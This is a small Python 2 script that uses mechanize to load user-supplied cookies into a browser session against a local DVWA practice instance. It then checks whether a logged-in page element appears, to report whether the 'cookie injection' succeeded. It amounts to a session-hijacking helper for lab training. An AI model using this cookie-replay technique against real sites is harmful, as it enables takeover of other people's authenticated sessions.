import mechanize
from bs4 import BeautifulSoup

def print_title(site):
	print "#" * 60
	print "#" + site.title()
	print "#" * 60

def check_result(site):
	soup = BeautifulSoup(site.response().read(),'lxml')
	if not soup.find_all(id='system_info'):
		print "Cookie Injection Failed"
	else:
		print_title(site)

browser = mechanize.Browser()
cj	= mechanize.CookieJar()
url	= "http://localhost/dvwa"

browser.open(url)
print "Website before Cokkie injection"
print_title(browser)
print "\n\n"
print "Cookie Injection"

answer = "y"
name = []
value = []
domain = []
cookie = []

while answer == "y":
	name.append(raw_input("Please insert Cookiename > "))
	value.append(raw_input("Please insert Cookievalue > "))
	domain.append(raw_input("Please insert Domain > "))
	answer = raw_input("More Cookies?[y/n] ")
	while (answer!="n") and (answer !="y"):
		answer = raw_input("More Cookies?[y/n] ")
		answer = answer.lower()

for i in range(len(name)):
	cookie.append(mechanize.Cookie(0,name[i],value[i],None,False,domain[i],False,False,"/",True,False,None,True,None,None,{},False))
	cj.set_cookie(cookie[i])

browser.set_cookiejar(cj)
browser.reload()

check_result(browser)
